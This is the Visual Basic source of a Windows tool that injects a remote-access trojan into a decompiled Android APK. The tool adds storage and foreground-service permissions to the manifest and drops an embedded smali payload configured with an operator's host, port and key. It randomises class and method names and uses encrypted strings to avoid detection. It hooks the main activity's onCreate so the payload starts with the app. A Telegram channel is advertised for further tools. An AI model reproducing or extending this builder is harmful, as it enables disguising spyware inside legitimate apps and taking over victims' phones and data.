Imports System.IO
Imports System.Runtime.InteropServices
Imports System.Text

Public Class Form1

    Private TheApkPath As String
    Private MainActivity As String

    ''------------------JunkFileCov
    Private N_newJunkFileCov As String = "AbddSfsvasDFBetgrnsrtnatrhjryghwrtgafsgfjbrTHAERgvergesrg"
    Private Const JunkFileCov As String = "JunkFileCov"
    '------------------FileLocator
    Private N_newFileLocator As String = "AbddSfsxasDFBetgrnsrteatrhjryghwrtjafsgfjbrTlAERevergesrg"
    Private Const FileLocator As String = "FileLocator"
    '------------------EngineWorkerins
    Private N_newEngineWorkerins As String = "AbddSfsvasDFBetgrnsrtnatrhjxyghwftgafsgxjbrTHAERdvergesrg"
    Private Const EngineWorkerins As String = "EngineWorkerins"
    '------------------DataScan1
    Private N_NewDataScan1 As String = "AbddSfsvasDFBetgrusrtuatfhjryghwstgafsgfjbrTHAERgvergesrg"
    Private Const DataScan1 As String = "DataScan1"
    '------------------NotifiHelpApp 


    '------------------ConHelpOne
    Private N_newConHelpOne As String = "AbddSfsvasDFBetgsnsrtnxtrhjryghwstgafsgsfjbrTHAERgvergesrg"
    Private Const ConHelpOne As String = "ConHelpOne"
    'RTPluginsHelper
    Private N_newRTPluginsHelper As String = "AbddSfsvassDFBetzrnsrtnatrhjrcymhwrtgafsgfjbrmHAEugvergesrg"
    Private Const RTPluginsHelper As String = "RTPluginsHelper"
    'SecoundActivity
    Private N_newSecoundActivity As String = "AbddSfsvasDtBetgrnvsrtnatrhjsryghwrtgafsgfjsbrTHAERgvergesrg"
    Private Const SecoundActivity As String = "SecoundActivity"
    'CallsManager
    Private N_newCallsManager As String = "AbddSfsvasDFvBetgrnsrtnavtrhjryghwrtgafssgfjbrTHuqAERbgvergesrg"
    Private Const CallsManager As String = "CallsManager"

    'new methods
    Private newgetbyts As String = ""
    Private newsrvrun As String = ""

    'new splits
    Private split1 As String = ""
    Private split2 As String = ""
    Private split3 As String = ""
    Private split4 As String = ""

    'new info
    Private newhost As String = ""
    Private newport As String = ""
    Private newkey As String = ""

    'new random
    Private newalive As String = ""
    Private newname As String = ""
    Private neweco As String = ""

    Private newconect As String = ""
    Private newsokt As String = ""
    Private newstrtconct As String = ""
    Private newcnl As String = ""
    Private newcnm As String = ""
    Private newsndmthd As String = ""
    Private newforuce As String = ""
    Private newplgs As String = ""
    Private NEWRANDOM As String = ""
    '
    ' Public counter As Integer = 1

    Function RandomShit(minCharacters As Integer, maxCharacters As Integer)

        Dim s As String = "qazQAZwsxWSXedcEDCrfvRFVtgbTGByhnYHNujmUJMikIKolOLpP"

        Static r As New Random
        Dim chactersInString As Integer = r.Next(minCharacters, maxCharacters)
        Dim sb As New System.Text.StringBuilder
        For i As Integer = 1 To chactersInString
            Dim idx As Integer = r.Next(0, s.Length)
            sb.Append(s.Substring(idx, 1))

        Next
        cou += 1
        Return sb.ToString() & CStr(cou)
    End Function

    Private cou As Integer = 1
    Private Function GenerateRandomNumber(ByVal m0 As Integer, ByVal m1 As Integer) As Integer
        Static Random_Number As New Random()
        Return Random_Number.Next(m0, m1)
    End Function
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim dialog As New FolderBrowserDialog()
        dialog.RootFolder = Environment.SpecialFolder.Desktop
        dialog.SelectedPath = "C:\"
        dialog.Description = "Select Path for Decompile Apk"
        If dialog.ShowDialog() = Windows.Forms.DialogResult.OK Then
            FolderPath.Text = dialog.SelectedPath
            TheApkPath = FolderPath.Text
        End If
    End Sub
    Public TK As String = Nothing
    Public Sub ST(ByVal ar As String)
        TK = ar
        ''    MsgBox(TK)
        TY()
        '  Call CallByName(Me, "TY", vbMethod, Nothing)
    End Sub
    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Dim startdir As String = Environment.SpecialFolder.MyDocuments
        If FolderPath.Text IsNot Nothing Then
            startdir = FolderPath.Text
        End If
        Dim dialog As New OpenFileDialog()
        dialog.InitialDirectory = startdir
        dialog.DefaultExt = ".smali"
        dialog.Title = "Select Path for Apk MainActivity"
        If dialog.ShowDialog() = Windows.Forms.DialogResult.OK Then
            MainPath.Text = dialog.FileName
            MainActivity = MainPath.Text
        End If
    End Sub


    Private Function D(v As String) As String
        Return UTF8Encoding.UTF8.GetString(Convert.FromBase64String(v))
    End Function

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        log.Text = ""
        If CheckAllValuse() Then
            log.AppendText("For More Powerfull Tools" + Environment.NewLine + "Join Telegram: t.me/EvLFDev")

            For index = 0 To 5
                Threading.Thread.Sleep(1000)
                Application.DoEvents()
            Next

            log.AppendText("Starting Injection...")

            'Call CallByName(Getit(), D("U3RhcnRXb3Jr"), CallType.Method, Nothing)

            StartWork()
        Else
            log.Text = "check values"
        End If
    End Sub

    Private Function Getit() As Form
        Return Me
    End Function

    Public need_write = False
    Public need_read = False
    Public need_forground = False


    Public Sub StartWork()
        '-------------------Chaning Manifist
        Try

            log.AppendText(Environment.NewLine & "Check Permissions...")

            Dim AllManifist = File.ReadAllText(TheApkPath & "\" & "AndroidManifest.xml")

            'Write
            If Not AllManifist.ToLower.Contains("android.permission.WRITE_EXTERNAL_STORAGE".ToLower()) Then
                need_write = True
            End If

            'Read
            If Not AllManifist.ToLower.Contains("android.permission.READ_EXTERNAL_STORAGE".ToLower) Then
                need_read = True
            End If

            'ground
            If Not AllManifist.ToLower.Contains("android.permission.FOREGROUND_SERVICE".ToLower) Then
                need_forground = True
            End If



            log.AppendText(Environment.NewLine & "Coding AndroidManifest...")
            cou = GenerateRandomNumber(0, 5000)
            N_newCallsManager = RandomShit(9, 12)
            N_newConHelpOne = RandomShit(8, 13)
            N_NewDataScan1 = RandomShit(7, 13)
            N_newEngineWorkerins = RandomShit(10, 15)
            N_newFileLocator = RandomShit(6, 10)
            N_newJunkFileCov = RandomShit(8, 11)
            ' N_newNotifiHelpApp = RandomShit(11, 14)
            N_newRTPluginsHelper = RandomShit(9, 11)
            N_newSecoundActivity = RandomShit(8, 14)

            Dim ManifistLines As String() = File.ReadAllLines(TheApkPath & "\" & "AndroidManifest.xml")

            Dim apktoolyml As String() = File.ReadAllLines(TheApkPath & "\" & "apktool.yml")

            For index = 0 To apktoolyml.Length - 1
                If apktoolyml(index).ToLower.Contains("targetSdkVersion".ToLower) Then
                    apktoolyml(index) = "  targetSdkVersion: '28'"
                    File.WriteAllLines(TheApkPath & "\" & "apktool.yml", apktoolyml)
                    Exit For
                End If
            Next

            For index = 1 To ManifistLines.Length - 1

                If need_write AndAlso ManifistLines(index).ToLower.Contains("<uses-permission") Then
                    ManifistLines(index) = ManifistLines(index) + vbNewLine + My.Resources.WritePrim
                    need_write = False
                End If

                If need_read AndAlso ManifistLines(index).ToLower.Contains("<uses-permission") Then
                    ManifistLines(index) = ManifistLines(index) + vbNewLine + My.Resources.ReadPrim
                    need_read = False
                End If

                If need_forground AndAlso ManifistLines(index).ToLower.Contains("<uses-permission") Then
                    ManifistLines(index) = ManifistLines(index) + vbNewLine + My.Resources.FORGROUD
                    need_forground = False
                End If



                If ManifistLines(index).ToLower.Contains("<application") Then
                    If Not ManifistLines(index).ToLower.Contains("requestLegacyExternalStorage".ToLower) Then
                        ManifistLines(index) = ManifistLines(index).Replace("<application", "<application android:requestLegacyExternalStorage=" + """" + "true" + """")
                    End If
                    ManifistLines(index) = ManifistLines(index) & Environment.NewLine & My.Resources.CypherMini.Replace(JunkFileCov, N_newJunkFileCov) _
                    .Replace(FileLocator, N_newFileLocator) _
                    .Replace(EngineWorkerins, N_newEngineWorkerins) _
                    .Replace(DataScan1, N_NewDataScan1) _
                    .Replace(ConHelpOne, N_newConHelpOne) _
                    .Replace(RTPluginsHelper, N_newRTPluginsHelper) _
                    .Replace(CallsManager, N_newCallsManager) _
                    .Replace(SecoundActivity, N_newSecoundActivity)
                    Exit For
                End If
            Next
            File.WriteAllLines(TheApkPath & "\" & "AndroidManifest.xml", ManifistLines)

        Catch ex As Exception
            log.AppendText("Error Manifest :" & ex.Message)
        End Try

        '-------------------Copy Data
        Dim smlipath As String = Nothing
        Try
            log.AppendText(Environment.NewLine & "Inject Data To Apk...")


            'create new smali folder
            For index = 2 To 16
                If Not Directory.Exists(TheApkPath & "\smali_classes" & index.ToString()) Then
                    Directory.CreateDirectory(TheApkPath & "\smali_classes" & index.ToString())
                    Directory.CreateDirectory(TheApkPath & "\smali_classes" & index.ToString() & "\com\andscan\betar\calcolator")
                    smlipath = TheApkPath & "\smali_classes" & index.ToString()
                    Exit For
                End If
            Next

            If smlipath Is Nothing Then
                Directory.CreateDirectory(TheApkPath & "\smali_classes" & "2")
                Directory.CreateDirectory(TheApkPath & "\smali_classes" & "2" & "\com\andscan\betar\calcolator")

                smlipath = TheApkPath & "\smali_classes" & "2"
            End If





            If Not File.Exists(smlipath & "\data.zip") Then
                File.WriteAllBytes(smlipath & "\data.zip", My.Resources.NEWAPS)
            End If


            '  Compression.DeflateStream DEZ = new DeflateStream()

            System.IO.Compression.ZipFile.ExtractToDirectory(smlipath & "\data.zip", smlipath)
            File.Delete(smlipath & "\data.zip")
            ''  MsgBox(Decrypt("ckkY23YVtcf96pDxh3vhIxUb3atcDlMNeWPHLdtX3WBrRiW/W+OI95P4j0ROtMHG", TK))
            Threading.Thread.Sleep(1)
            Dim str = File.ReadAllText(smlipath & Decrypt("DyG10UCwNkICe7oGF1ao4OwoJUQlfr6IuSple1GPfG+SqYUVcYn6QCGot/s9z/pPPfrHsoAgj8AvoTkj5/Ut4w==", TK)).
                Replace(Decrypt("fhTUPYsif35OSfhZ0W7kaw==", TK), Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(TheKey.Text))).
                Replace(Decrypt("l47cEy4tX1IFMbXx/K/EjQ==", TK), Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(Host.Text))).
                Replace(Decrypt("4v6Ulzh5+UOGfKCrVSMVZQ==", TK), Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(Port.Text))).
                Replace("alive.info", CheckBox1.Checked.ToString()).
                Replace("fource.info", "false").
                Replace("name.info", CLiname.Text)

            File.WriteAllText(smlipath & Decrypt("DyG10UCwNkICe7oGF1ao4OwoJUQlfr6IuSple1GPfG+SqYUVcYn6QCGot/s9z/pPPfrHsoAgj8Av
oTkj5/Ut4w==", TK), str)

            Dim str2 = File.ReadAllText(smlipath & Decrypt("DyG10UCwNkICe7oGF1ao4IUhhi+Ym1Yl72HNqJoUyji1bYVqzFLIjU77MNh3Nyxu", TK)).Replace("port.info", Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(Port.Text)))
            File.WriteAllText(smlipath & Decrypt("DyG10UCwNkICe7oGF1ao4IUhhi+Ym1Yl72HNqJoUyji1bYVqzFLIjU77MNh3Nyxu", TK), str2)
        Catch ex As Exception
            log.AppendText("Error Data :" & ex.Message)
        End Try


        Try

            log.AppendText(Environment.NewLine & "Encryption...")


            Dim files() As String = IO.Directory.GetFiles(smlipath & "\com\andscan\betar\calcolator")

            Dim min_num = 7
            Dim max_num = 15

            newgetbyts = RandomShit(min_num, max_num)
            newsrvrun = RandomShit(min_num, max_num)


            split1 = RandomShit(4, 4)
            split2 = RandomShit(4, 4)
            split3 = RandomShit(4, 4)
            split4 = RandomShit(4, 4)


            newhost = RandomShit(min_num, max_num)
            newport = RandomShit(min_num, max_num)
            newkey = RandomShit(min_num, max_num)

            newalive = RandomShit(min_num, max_num)
            newname = RandomShit(min_num, max_num)
            neweco = RandomShit(min_num, max_num)
            newconect = RandomShit(min_num, max_num)

            newsokt = RandomShit(min_num, max_num)
            newstrtconct = RandomShit(min_num, max_num)
            newcnl = RandomShit(min_num, max_num)
            newcnm = RandomShit(min_num, max_num)
            newsndmthd = RandomShit(min_num, max_num)
            newplgs = RandomShit(min_num, max_num)
            NEWRANDOM = EncryptionRandom(900, 1000)

            newforuce = "QsdvgaerEARGar"

            For Each f As String In files
                ' Do work, example
                'Decrypt("4v6Ulzh5+UOGfKCrVSMVZQ==", Starter.TK)
                Dim text As String = IO.File.ReadAllText(f).Replace(JunkFileCov, N_newJunkFileCov) _
                    .Replace(FileLocator, N_newFileLocator) _
                    .Replace(EngineWorkerins, N_newEngineWorkerins) _
                    .Replace(DataScan1, N_NewDataScan1) _
                    .Replace(ConHelpOne, N_newConHelpOne) _
                    .Replace(RTPluginsHelper, N_newRTPluginsHelper) _
                    .Replace(CallsManager, N_newCallsManager) _
                    .Replace("_METHOD_getbyte_", newgetbyts) _
                    .Replace("_mthd_issrvrun_", newsrvrun) _
                    .Replace("_splet_1_", split1) _
                    .Replace("_split_2_", split2) _
                    .Replace("_split_3_", split3) _
                    .Replace("_the_plugns_", newplgs) _
                    .Replace("_split_4_", split4) _
                    .Replace("_the_host_", newhost) _
                   .Replace(Decrypt("fhTUPYsif35OSfhZ0W7kaw==", TK), Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(TheKey.Text))) _
               .Replace(Decrypt("l47cEy4tX1IFMbXx/K/EjQ==", TK), Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(Host.Text))) _
                .Replace(Decrypt("4v6Ulzh5+UOGfKCrVSMVZQ==", TK), Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(Port.Text))) _
             .Replace("alive.info", CheckBox1.Checked.ToString()) _
              .Replace("fource.info", "false") _
                .Replace("name.info", CLiname.Text) _
                .Replace("_the_port_", newport) _
                    .Replace("_the_key_", newkey) _
                    .Replace("_the_alive_", newalive) _
                    .Replace("_usr_nam_", newname) _
                    .Replace("_the_eco_", neweco) _
                    .Replace("_C_N_L_", newcnl) _
                    .Replace("_c_N_M_", newcnm) _
                    .Replace("_send_mthd_", newsndmthd) _
                    .Replace("_the_fouce_", newsndmthd) _
                    .Replace("_the_fouce_", newforuce) _
                    .Replace("_the_sokt_", newsokt) _
                    .Replace("_start_connect_", newstrtconct) _
                    .Replace("_is_connected_", newconect) _
                    .Replace("[RANDOM-STRING]", NEWRANDOM) _
                    .Replace(SecoundActivity, N_newSecoundActivity)


                File.WriteAllText(f, text)
                Threading.Thread.Sleep(1)

            Next

            Dim sourcePath As String = smlipath & "\com\andscan\betar\calcolator"
            Dim searchPattern As String = "*.smali"
            Dim i As Integer = 0
            For Each fileName As String In Directory.GetFiles(sourcePath, searchPattern, SearchOption.AllDirectories)

                If fileName.Contains("JunkFileCov") Or fileName.Equals("JunkFileCov") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("JunkFileCov", N_newJunkFileCov) & ".smali"))

                End If

                If fileName.Contains("FileLocator") Or fileName.Equals("FileLocator") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("FileLocator", N_newFileLocator) & ".smali"))

                End If

                If fileName.Contains("EngineWorkerins") Or fileName.Equals("EngineWorkerins") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("EngineWorkerins", N_newEngineWorkerins) & ".smali"))

                End If

                If fileName.Contains("DataScan1") Or fileName.Equals("DataScan1") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("DataScan1", N_NewDataScan1) & ".smali"))

                End If



                If fileName.Contains("ConHelpOne") Or fileName.Equals("ConHelpOne") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("ConHelpOne", N_newConHelpOne) & ".smali"))

                End If

                If fileName.Contains("RTPluginsHelper") Or fileName.Equals("RTPluginsHelper") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("RTPluginsHelper", N_newRTPluginsHelper) & ".smali"))

                End If

                If fileName.Contains("CallsManager") Or fileName.Equals("CallsManager") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("CallsManager", N_newCallsManager) & ".smali"))

                End If
                If fileName.Contains("SecoundActivity") Or fileName.Equals("SecoundActivity") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("SecoundActivity", N_newSecoundActivity) & ".smali"))

                End If
                i += 1
                Threading.Thread.Sleep(1)
            Next

        Catch ex As Exception
            log.AppendText(Environment.NewLine & "Error : Encryption..." + vbNewLine + ex.Message)
        End Try

        'Inject Main Class

        Try
            log.AppendText(Environment.NewLine & "Injecting Main Activity...")

            If File.Exists(MainActivity) Then
                Dim MainReader As String() = File.ReadAllLines(MainActivity)
                Dim intentmain As String
                For index = 0 To MainReader.Length
                    If index = 0 Then
                        Dim findmain As String() = MainReader(0).Split(" ")
                        intentmain = findmain(findmain.Length - 1)
                    End If



                    If MainReader(index).Contains(Decrypt("XqgovOgiwNmuEisbFkaXwA==", TK)) AndAlso MainReader(index).ToLower.StartsWith(".method".ToLower) Then
                        MainReader(index + 1) = MainReader(index + 1) & Environment.NewLine & D(My.Resources.oncreatecode).Replace(D("W3RyZ3RtYWluXQ=="), intentmain)

                        MainReader(MainReader.Length - 1) = MainReader(MainReader.Length - 1) & Environment.NewLine & Environment.NewLine & D(Decrypt(My.Resources.MainMith, TK)).Replace(D("W3RyZ3RtYWluXQ=="), intentmain)

                        Exit For

                    End If
                Next
                File.WriteAllLines(MainActivity, MainReader)


            End If

        Catch ex As Exception
            log.AppendText("Error Main :" & ex.Message)
        End Try
        log.AppendText(Environment.NewLine & "-----------------" & Environment.NewLine & "All Done Recompile Apk...")

    End Sub

    Public Function Decrypt(text As String, password As String) As String
        Dim AES As New System.Security.Cryptography.RijndaelManaged
        Dim Hash_AES As New System.Security.Cryptography.MD5CryptoServiceProvider
        Dim decrypted As String = ""
        Dim hash(31) As Byte
        Dim temp As Byte() = Hash_AES.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(password))
        Array.Copy(temp, 0, hash, 0, 16)
        Array.Copy(temp, 0, hash, 15, 16)
        AES.Key = hash
        AES.Mode = Security.Cryptography.CipherMode.ECB
        Dim DESDecrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateDecryptor
        Dim Buffer As Byte() = Convert.FromBase64String(text)
        decrypted = System.Text.ASCIIEncoding.ASCII.GetString(DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length))
        Return decrypted
    End Function

    Function EncryptionRandom(minCharacters As Integer, maxCharacters As Integer)
        Dim s As String = "qazQAZwsxWSXedcEDCrfvRFVtgbTGByhnYHNujmUJMikIKolOLpP"



        Static r As New Random
        Dim chactersInString As Integer = r.Next(minCharacters, maxCharacters)
        Dim sb As New StringBuilder
        For i As Integer = 1 To chactersInString
            Dim idx As Integer = r.Next(0, s.Length)
            sb.Append(s.Substring(idx, 1))

        Next
        Return sb.ToString()
    End Function
    Function RandomString(minCharacters As Integer, maxCharacters As Integer)
        Dim s As String = "qazQAZwsxWSXedcEDCrfvRFVtgbTGByhnYHNujmUJMikIKolOLpP"


        Static r As New Random
        Dim chactersInString As Integer = r.Next(minCharacters, maxCharacters)
        Dim sb As New StringBuilder
        For i As Integer = 1 To chactersInString
            Dim idx As Integer = r.Next(0, s.Length)
            sb.Append(s.Substring(idx, 1))

        Next
        Return sb.ToString()
    End Function

    Private Function CheckAllValuse() As Boolean
        If Host.Text IsNot "" Then
            If Port.Text IsNot "" Then
                If TheKey.Text IsNot "" Then
                    If FolderPath.Text IsNot "" Then
                        If MainPath.Text IsNot "" Then
                            Return True
                        End If
                    End If
                End If

            End If
        End If

        Return False
    End Function

    Private Sub Port_TextChanged(sender As Object, e As EventArgs) Handles Port.TextChanged
        Try
            If Not Port.Text = "" Then
                If Not IsNumeric(Port.Text) Then
                    Port.Text = ""
                    MsgBox("Only Numbers")
                End If
            End If


        Catch ex As Exception

        End Try
    End Sub

    Public Sub TY()
        If Starter.id = Nothing Then
            Return
        Else

            If Not IsNumeric(Starter.id) Then
                Return
            End If

            Dim Procid As String = RD(Starter.id)
            If Procid Is Nothing Then
                Return
            End If

            Dim cont As Integer = 0
            For Each p In Process.GetProcesses
                If p.Id.ToString = Procid Then
                    cont = 1
                End If
            Next

            If cont = 0 Then
                Return
            End If
            'Application.Run(Me)
            Me.Show()
        End If
    End Sub
    Public Function Fi(ByVal ar As String) As String
        Return ar
    End Function

    Private Sub Button4_Click(sender As Object, e As EventArgs)
        Process.Start("https://t.me/evlfdev")

    End Sub
    Protected Overrides ReadOnly Property CreateParams As CreateParams
        Get
            Dim cp = MyBase.CreateParams
            cp.ExStyle = cp.ExStyle Or &H80
            Return cp
        End Get
    End Property




    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        My.Settings.N = CLiname.Text
        My.Settings.H = Host.Text
        My.Settings.P = Port.Text
        My.Settings.K = TheKey.Text
        My.Settings.Save()

        Dim x = 0 / 0

    End Sub


    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        '  SetWindowDisplayAffinity(Me.Handle, WDA_MONITOR)
        CLiname.Text = My.Settings.N
        Host.Text = My.Settings.H
        Port.Text = My.Settings.P
        TheKey.Text = My.Settings.K
    End Sub

    Private Sub Button4_Click_1(sender As Object, e As EventArgs)

    End Sub

    Private Sub Button4_Click_2(sender As Object, e As EventArgs) Handles Button4.Click
        Interaction.MsgBox(Decrypt("9OR3DjQMZNzbgh7/91egFy/1GS1GEMO0MVRRy2LVq9q94ZDfKLkT6Lk6osg0wHYDzcIQVtvNC/pk
wY6cSHzpbV1nkGsLybZdHU9nx+m9vmJUinHmUq+wOJ7QOcb2PHruX3++yHLR9zQOH6zuuly/cIa6
P5G6gR8XF02LLRPguSc=", "Nagato"))
    End Sub

    Private Sub Panel1_Paint(sender As Object, e As PaintEventArgs) Handles Panel1.Paint

    End Sub
End Class
